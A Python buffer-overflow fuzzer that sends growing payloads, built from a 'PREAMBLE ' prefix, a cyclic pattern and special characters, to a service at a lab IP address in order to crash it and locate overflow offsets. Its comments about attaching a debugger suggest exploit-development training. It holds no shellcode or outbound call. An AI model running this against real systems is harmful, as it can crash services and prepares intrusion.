import socket
import time
import sys
import pattern

# Target IP
targetIP = "192.168.44.136" # Modify as needed

# Target port
targetPort = 4567 # Modify as needed

# Reconnect timeout (seconds)
reconnectTimeout = 1

# Pause time between payloads (seconds)
pauseTime = 0.5

# This is the initial size, but we will try increasing
# sizes until one of them breaks the target
payloadSize = 84 # Modify if desired, but this value WORKS

# Number of bytes to increment payload size by on each
# iteration
payloadIncrement = 100 # Modify if desired, but this value WORKS

# May payload size to try
payloadMax = 5000 # Modify if desired, but this value WORKS

# Payload character. This character will be repeated 'payloadSize'
# times. If empty then a pattern will be used instead. Using a
# specific character is good for discovering overflows, but using
# the pattern is good for finding specific offsets.
payloadPrimaryChar = b""

# If something needs prepended to the payload then put it here
payloadPrepend = b"PREAMBLE " # Modify as needed

# If you want to include any special characters whose presence
# might be critical to correct processing of the payload then
# include them here. The current set below is kind of a shotgun
# approach.
payloadCriticalChars = b"!@#$%^&*()-_=+/\\" # Modify as desired

# Send incrementally larger payloads until the target stops
# responding or we hit our max payload size
while (payloadSize < payloadMax):
    # Build buffer
    buffer =  b""
    buffer += payloadPrepend

    if payloadPrimaryChar == b"":
        buffer += pattern.pattern_gen(
            payloadSize - len(payloadPrepend) - len(payloadCriticalChars)
            ).encode('utf-8')
    else:
        buffer += payloadPrimaryChar * (payloadSize - len(payloadPrepend) - len(payloadCriticalChars))

    for c in payloadCriticalChars:
        buffer += c.to_bytes(1,'big')

    # Attempt connection to target
    try:
        print("Attempting connection to target,")
        print("did you remember to start it in")
        print("a debugger so that you can catch")
        print("exceptions?")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(reconnectTimeout)
        s.connect((targetIP, targetPort))
    except:
        print("\nUnable to connect to target, is it running?")
        sys.exit(1)
    
    # Read welcome message to clear the pipe
    try:
        time.sleep(0.1)
        s.recv(1024)
    except:
        print("\nUnable to read welcome message from target!")
        sys.exit(1)

    # Send payload
    try:
        print("\nSending payload of %d bytes" % payloadSize)
        s.send(buffer)
    except:
        print("\nUnable to send payload!")
        sys.exit(1)
    
    # Read response from starget
    try:
        time.sleep(0.1)
        s.recv(1024)
    except:
        print("\nUnable to read response from the target, check")
        print("your debugger for exceptions!")
        sys.exit(1)
    
    # Close connection
    s.close()

    # Give a moment between payloads
    time.sleep(pauseTime)

    # Increment payload size
    payloadSize += payloadIncrement

# Set the timeout back to 'None'
s.settimeout(None)

# Close the socket
s.close()

# Print an exit notice
print("\nReached the max payload size. It is possible that one of")
print("the payloads triggered an exception inside of a thread")
print("handling requests such that the main function continues")
print("to handle new connections. Check your debugger!")

# Exit
sys.exit(0)